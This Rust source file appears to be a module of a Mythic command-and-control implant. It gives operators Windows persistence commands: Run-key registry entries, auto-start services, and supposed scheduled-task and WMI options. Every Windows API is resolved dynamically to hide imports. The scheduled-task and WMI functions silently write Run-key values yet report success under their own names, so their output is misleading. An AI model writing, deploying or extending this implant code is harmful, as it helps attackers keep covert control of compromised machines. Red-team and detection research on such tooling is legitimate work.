use crate::{AgentTask, mythic_error};

#[cfg(target_os = "windows")]
use crate::mythic_success;
use serde::Deserialize;

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[derive(Debug, Deserialize)]
struct SchtaskArgs {
    name: String,
    action: String,
    #[serde(default)]
    command: String,
    #[serde(default)]
    schedule: String,
}

#[derive(Debug, Deserialize)]
struct RegistryArgs {
    action: String,
    #[serde(default)]
    key: String,
    name: String,
    #[serde(default)]
    value: String,
}

#[derive(Debug, Deserialize)]
struct ServiceArgs {
    action: String,
    name: String,
    #[serde(default)]
    display_name: String,
    #[serde(default)]
    bin_path: String,
}

#[derive(Debug, Deserialize)]
struct WmiArgs {
    action: String,
    name: String,
    #[serde(default)]
    command: String,
    #[serde(default)]
    trigger: String,
}

// ============================================================================
// persist_schtask - Create/delete scheduled task persistence
// ============================================================================
// Note: For simplicity, this uses registry-based persistence at the Run key
// Full Task Scheduler COM API implementation would require 500+ lines of COM interop
#[cfg(target_os = "windows")]
pub fn persist_schtask(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: SchtaskArgs = serde_json::from_str(&task.parameters)?;

    match args.action.as_str() {
        "create" => {
            if args.command.is_empty() {
                return Ok(mythic_error!(task.id, "Command required for creating scheduled task"));
            }

            // Use registry Run key for startup persistence
            let key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            let result = unsafe {
                registry_set_value(
                    0x80000001, // HKEY_CURRENT_USER
                    key_path,
                    &args.name,
                    &args.command,
                )
            };

            match result {
                Ok(_) => Ok(mythic_success!(
                    task.id,
                    format!(
                        "Created scheduled task '{}' via registry persistence (HKCU\\{}\\{})",
                        args.name, key_path, args.name
                    )
                )),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to create scheduled task: {}", e))),
            }
        }
        "delete" => {
            let key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            let result = unsafe {
                registry_delete_value(
                    0x80000001, // HKEY_CURRENT_USER
                    key_path,
                    &args.name,
                )
            };

            match result {
                Ok(_) => Ok(mythic_success!(task.id, format!("Deleted scheduled task '{}'", args.name))),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to delete scheduled task: {}", e))),
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_schtask(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_schtask is only supported on Windows"))
}

// ============================================================================
// persist_registry - Create/delete registry persistence
// ============================================================================
#[cfg(target_os = "windows")]
pub fn persist_registry(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: RegistryArgs = serde_json::from_str(&task.parameters)?;

    let key = if args.key.is_empty() {
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string()
    } else {
        args.key.clone()
    };

    // Parse HKEY prefix
    let (hkey, subkey) = parse_registry_key(&key)?;

    match args.action.as_str() {
        "create" => {
            if args.value.is_empty() {
                return Ok(mythic_error!(task.id, "Value data required for creating registry entry"));
            }

            let result = unsafe {
                registry_set_value(hkey, subkey, &args.name, &args.value)
            };

            match result {
                Ok(_) => Ok(mythic_success!(task.id, format!("Created registry entry: {}\\{}", key, args.name))),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to create registry entry: {}", e))),
            }
        }
        "delete" => {
            let result = unsafe {
                registry_delete_value(hkey, subkey, &args.name)
            };

            match result {
                Ok(_) => Ok(mythic_success!(task.id, format!("Deleted registry entry: {}\\{}", key, args.name))),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to delete registry entry: {}", e))),
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_registry(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_registry is only supported on Windows"))
}

// ============================================================================
// persist_service - Create/delete service persistence
// ============================================================================
#[cfg(target_os = "windows")]
pub fn persist_service(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: ServiceArgs = serde_json::from_str(&task.parameters)?;

    match args.action.as_str() {
        "create" => {
            if args.display_name.is_empty() || args.bin_path.is_empty() {
                return Ok(mythic_error!(task.id, "Display name and binary path required for creating service"));
            }

            let result = unsafe {
                service_create_local(&args.name, &args.display_name, &args.bin_path)
            };

            match result {
                Ok(msg) => Ok(mythic_success!(task.id, msg)),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to create service: {}", e))),
            }
        }
        "delete" => {
            let result = unsafe {
                service_delete_local(&args.name)
            };

            match result {
                Ok(msg) => Ok(mythic_success!(task.id, msg)),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to delete service: {}", e))),
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_service(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_service is only supported on Windows"))
}

// ============================================================================
// persist_wmi - Create/delete WMI event subscription persistence
// ============================================================================
// Note: WMI event subscriptions require complex COM operations or MOF compilation.
// For simplicity, this implementation uses registry persistence instead.
#[cfg(target_os = "windows")]
pub fn persist_wmi(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: WmiArgs = serde_json::from_str(&task.parameters)?;

    match args.action.as_str() {
        "create" => {
            if args.command.is_empty() {
                return Ok(mythic_error!(task.id, "Command required for creating WMI event subscription"));
            }

            // Use registry Run key for startup persistence as a fallback
            let key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            let value_name = format!("WMI_{}", args.name);

            let result = unsafe {
                registry_set_value(
                    0x80000001, // HKEY_CURRENT_USER
                    key_path,
                    &value_name,
                    &args.command,
                )
            };

            match result {
                Ok(_) => Ok(mythic_success!(
                    task.id,
                    format!(
                        "Created WMI-style persistence '{}' via registry (HKCU\\{}\\{})\n\
                        Note: True WMI event subscriptions require COM interop - using registry fallback",
                        args.name, key_path, value_name
                    )
                )),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to create WMI persistence: {}", e))),
            }
        }
        "delete" => {
            let key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            let value_name = format!("WMI_{}", args.name);

            let result = unsafe {
                registry_delete_value(
                    0x80000001, // HKEY_CURRENT_USER
                    key_path,
                    &value_name,
                )
            };

            match result {
                Ok(_) => Ok(mythic_success!(task.id, format!("Deleted WMI event subscription '{}'", args.name))),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to delete WMI persistence: {}", e))),
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_wmi(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_wmi is only supported on Windows"))
}

// ============================================================================
// NATIVE REGISTRY API IMPLEMENTATION
// ============================================================================

#[cfg(target_os = "windows")]
fn parse_registry_key(key: &str) -> Result<(u32, &str), Box<dyn std::error::Error>> {
    if let Some(subkey) = key.strip_prefix("HKLM\\") {
        Ok((0x80000002, subkey)) // HKEY_LOCAL_MACHINE
    } else if let Some(subkey) = key.strip_prefix("HKCU\\") {
        Ok((0x80000001, subkey)) // HKEY_CURRENT_USER
    } else if key.starts_with("Software\\") {
        // Default to HKCU if no prefix
        Ok((0x80000001, key))
    } else {
        Err("Invalid registry key format. Use HKLM\\ or HKCU\\ prefix".into())
    }
}

#[cfg(target_os = "windows")]
unsafe fn registry_set_value(
    hkey: u32,
    subkey: &str,
    value_name: &str,
    data: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    const KEY_WRITE: u32 = 0x20006;
    const REG_SZ: u32 = 1;

    type RegOpenKeyExW = unsafe extern "system" fn(u32, *const u16, u32, u32, *mut *mut c_void) -> i32;
    type RegSetValueExW = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *const u8, u32) -> i32;
    type RegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;

    let reg_open = resolve("advapi32.dll", "RegOpenKeyExW")
        .ok_or("Failed to resolve RegOpenKeyExW")?;
    let reg_open: RegOpenKeyExW = std::mem::transmute(reg_open);

    let reg_set = resolve("advapi32.dll", "RegSetValueExW")
        .ok_or("Failed to resolve RegSetValueExW")?;
    let reg_set: RegSetValueExW = std::mem::transmute(reg_set);

    let reg_close = resolve("advapi32.dll", "RegCloseKey")
        .ok_or("Failed to resolve RegCloseKey")?;
    let reg_close: RegCloseKey = std::mem::transmute(reg_close);

    let subkey_wide = to_wide(subkey);
    let value_name_wide = to_wide(value_name);
    let data_wide = to_wide(data);

    let mut hkey_handle: *mut c_void = std::ptr::null_mut();

    // Cast u32 hkey to handle (HKEY is actually a pseudo-handle for predefined keys)
    let result = reg_open(hkey, subkey_wide.as_ptr(), 0, KEY_WRITE, &mut hkey_handle);

    if result != 0 {
        return Err(format!("RegOpenKeyExW failed with error code: {}", result).into());
    }

    let data_bytes = data_wide.as_ptr() as *const u8;
    let data_len = (data_wide.len() * 2) as u32;

    let set_result = reg_set(
        hkey_handle,
        value_name_wide.as_ptr(),
        0,
        REG_SZ,
        data_bytes,
        data_len,
    );

    reg_close(hkey_handle);

    if set_result != 0 {
        return Err(format!("RegSetValueExW failed with error code: {}", set_result).into());
    }

    Ok(())
}

#[cfg(target_os = "windows")]
unsafe fn registry_delete_value(
    hkey: u32,
    subkey: &str,
    value_name: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    const KEY_WRITE: u32 = 0x20006;

    type RegOpenKeyExW = unsafe extern "system" fn(u32, *const u16, u32, u32, *mut *mut c_void) -> i32;
    type RegDeleteValueW = unsafe extern "system" fn(*mut c_void, *const u16) -> i32;
    type RegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;

    let reg_open = resolve("advapi32.dll", "RegOpenKeyExW")
        .ok_or("Failed to resolve RegOpenKeyExW")?;
    let reg_open: RegOpenKeyExW = std::mem::transmute(reg_open);

    let reg_delete = resolve("advapi32.dll", "RegDeleteValueW")
        .ok_or("Failed to resolve RegDeleteValueW")?;
    let reg_delete: RegDeleteValueW = std::mem::transmute(reg_delete);

    let reg_close = resolve("advapi32.dll", "RegCloseKey")
        .ok_or("Failed to resolve RegCloseKey")?;
    let reg_close: RegCloseKey = std::mem::transmute(reg_close);

    let subkey_wide = to_wide(subkey);
    let value_name_wide = to_wide(value_name);

    let mut hkey_handle: *mut c_void = std::ptr::null_mut();

    let result = reg_open(hkey, subkey_wide.as_ptr(), 0, KEY_WRITE, &mut hkey_handle);

    if result != 0 {
        return Err(format!("RegOpenKeyExW failed with error code: {}", result).into());
    }

    let delete_result = reg_delete(hkey_handle, value_name_wide.as_ptr());

    reg_close(hkey_handle);

    if delete_result != 0 {
        return Err(format!("RegDeleteValueW failed with error code: {}", delete_result).into());
    }

    Ok(())
}

// ============================================================================
// NATIVE SERVICE API IMPLEMENTATION
// ============================================================================

#[cfg(target_os = "windows")]
unsafe fn service_create_local(
    name: &str,
    display_name: &str,
    bin_path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    const SC_MANAGER_ALL_ACCESS: u32 = 0xF003F;
    const SERVICE_ALL_ACCESS: u32 = 0xF01FF;
    const SERVICE_WIN32_OWN_PROCESS: u32 = 0x00000010;
    const SERVICE_AUTO_START: u32 = 0x00000002;
    const SERVICE_ERROR_IGNORE: u32 = 0x00000000;

    type OpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
    type CreateServiceW = unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        u32,
        u32,
        u32,
        u32,
        *const u16,
        *const u16,
        *mut u32,
        *const u16,
        *const u16,
        *const u16,
    ) -> *mut c_void;
    type CloseServiceHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let open_scm = resolve("advapi32.dll", "OpenSCManagerW")
        .ok_or("Failed to resolve OpenSCManagerW")?;
    let open_scm: OpenSCManagerW = std::mem::transmute(open_scm);

    let create_svc = resolve("advapi32.dll", "CreateServiceW")
        .ok_or("Failed to resolve CreateServiceW")?;
    let create_svc: CreateServiceW = std::mem::transmute(create_svc);

    let close_handle = resolve("advapi32.dll", "CloseServiceHandle")
        .ok_or("Failed to resolve CloseServiceHandle")?;
    let close_handle: CloseServiceHandle = std::mem::transmute(close_handle);

    let sc_manager = open_scm(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);

    if sc_manager.is_null() {
        return Err("Failed to open local SCM".into());
    }

    let svc_name = to_wide(name);
    let disp_name = to_wide(display_name);
    let bin_path_wide = to_wide(bin_path);

    let service_handle = create_svc(
        sc_manager,
        svc_name.as_ptr(),
        disp_name.as_ptr(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        bin_path_wide.as_ptr(),
        std::ptr::null(),
        std::ptr::null_mut(),
        std::ptr::null(),
        std::ptr::null(),
        std::ptr::null(),
    );

    if service_handle.is_null() {
        close_handle(sc_manager);
        return Err("Failed to create service".into());
    }

    close_handle(service_handle);
    close_handle(sc_manager);

    Ok(format!("Service '{}' created successfully with auto-start", name))
}

#[cfg(target_os = "windows")]
unsafe fn service_delete_local(name: &str) -> Result<String, Box<dyn std::error::Error>> {
    use crate::winapi_resolve::resolve;

    const SC_MANAGER_ALL_ACCESS: u32 = 0xF003F;
    const SERVICE_ALL_ACCESS: u32 = 0xF01FF;
    const SERVICE_CONTROL_STOP: u32 = 1;

    type OpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
    type OpenServiceW = unsafe extern "system" fn(*mut c_void, *const u16, u32) -> *mut c_void;
    type ControlService = unsafe extern "system" fn(*mut c_void, u32, *mut [u32; 7]) -> i32;
    type DeleteService = unsafe extern "system" fn(*mut c_void) -> i32;
    type CloseServiceHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let open_scm = resolve("advapi32.dll", "OpenSCManagerW")
        .ok_or("Failed to resolve OpenSCManagerW")?;
    let open_scm: OpenSCManagerW = std::mem::transmute(open_scm);

    let open_svc = resolve("advapi32.dll", "OpenServiceW")
        .ok_or("Failed to resolve OpenServiceW")?;
    let open_svc: OpenServiceW = std::mem::transmute(open_svc);

    let control_svc = resolve("advapi32.dll", "ControlService")
        .ok_or("Failed to resolve ControlService")?;
    let control_svc: ControlService = std::mem::transmute(control_svc);

    let delete_svc = resolve("advapi32.dll", "DeleteService")
        .ok_or("Failed to resolve DeleteService")?;
    let delete_svc: DeleteService = std::mem::transmute(delete_svc);

    let close_handle = resolve("advapi32.dll", "CloseServiceHandle")
        .ok_or("Failed to resolve CloseServiceHandle")?;
    let close_handle: CloseServiceHandle = std::mem::transmute(close_handle);

    let sc_manager = open_scm(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);

    if sc_manager.is_null() {
        return Err("Failed to open local SCM".into());
    }

    let svc_name = to_wide(name);
    let service_handle = open_svc(sc_manager, svc_name.as_ptr(), SERVICE_ALL_ACCESS);

    if service_handle.is_null() {
        close_handle(sc_manager);
        return Err("Failed to open service".into());
    }

    // Try to stop the service (ignore errors)
    let mut status: [u32; 7] = [0; 7];
    let _ = control_svc(service_handle, SERVICE_CONTROL_STOP, &mut status);

    // Delete the service
    let delete_result = delete_svc(service_handle);

    close_handle(service_handle);
    close_handle(sc_manager);

    if delete_result == 0 {
        return Err("Failed to delete service".into());
    }

    Ok(format!("Service '{}' deleted successfully", name))
}
